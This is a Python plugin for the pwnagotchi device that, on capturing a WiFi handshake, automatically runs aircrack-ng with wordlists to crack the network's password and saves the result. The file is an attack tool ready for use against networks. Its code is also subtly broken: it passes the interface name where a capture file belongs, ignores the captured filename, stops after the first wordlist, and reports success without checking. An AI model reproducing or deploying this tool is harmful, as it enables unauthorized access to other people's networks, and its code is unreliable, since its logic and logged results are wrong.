import subprocess
import logging
import os
from pwnagotchi import plugins


class WiFiPasswordCracker(plugins.Plugin):
    __author__ = "Deus Dust"
    __version__ = "1.0.0"
    __license__ = "MIT"
    __description__ = "Plugin to crack WiFi passwords when a handshake is captured."

    def __init__(self):
        super().__init__()  # Simplified super() call
        self.log = logging.getLogger(__name__)

    def crack_wifi_password(
        self,
        target_bssid,
        wordlist_path="/home/pi/wordlists/",
        interface="wlan0",
    ):
        try:
            # Iterate over each .txt file in the wordlist_path directory
            for filename in os.listdir(wordlist_path):
                if filename.endswith(".txt"):
                    full_path = os.path.join(wordlist_path, filename)
                    output_file = f"/home/pi/cracked/cracked_{target_bssid}.txt"
                    self.log.info(f"Using wordlist: {full_path}")

                    subprocess.run(
                        [
                            "aircrack-ng",
                            "-b",
                            target_bssid,
                            "-w",
                            full_path,
                            "-l",
                            output_file,
                            interface,
                        ],
                        check=True,
                    )
                    self.log.info(
                        f"WiFi password cracked for {target_bssid} using {filename}"
                    )
                    return  # Exit if the password is found
        except subprocess.CalledProcessError as e:
            self.log.error(f"Failed to crack WiFi password: {e}")

    def on_loaded(self):
        self.log.info("WiFi Password Cracker Plugin loaded")

    def on_handshake(self, agent, filename, access_point):
        target_bssid = access_point["bssid"]
        self.crack_wifi_password(target_bssid)

    def on_unload(self):
        self.log.info("WiFi Password Cracker Plugin unloaded")


# Instantiate the plugin
plugin = WiFiPasswordCracker()
